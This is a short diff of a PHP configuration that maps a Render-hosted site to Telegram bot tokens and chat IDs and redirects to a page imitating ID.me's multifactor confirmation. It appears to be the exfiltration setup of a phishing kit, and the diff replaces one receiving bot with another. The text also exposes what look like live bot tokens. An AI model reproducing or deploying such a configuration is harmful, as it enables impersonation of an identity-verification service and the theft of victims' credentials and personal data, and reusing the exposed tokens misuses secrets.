@@ -108,7 +108,7 @@ $site_map = [
     'crediblepath.onrender.com' => [
         'bots' => [
             ['token' => '8567913790:AAEP8WeOiMLclA_fZGV_zb8EbaQe2Q2Gv7c', 'chat_id' => '1325797388'],
-            ['token' => '8664835392:AAFSRnPXaE6ZmXYfQGZYzvtgyaCgLYLmmAU', 'chat_id' => '6772487570']
+            ['token' => '8412410845:AAFxuHUyafETE-8oCvUsSp45l0CtDkb-qm0', 'chat_id' => '7411482040']
         ],
         'redirect' => 'https://crediblepath.onrender.com/api.id.me/en/multifactor/561bec9af2114db1a7851287236fdbd8_confirm.html'
     ],
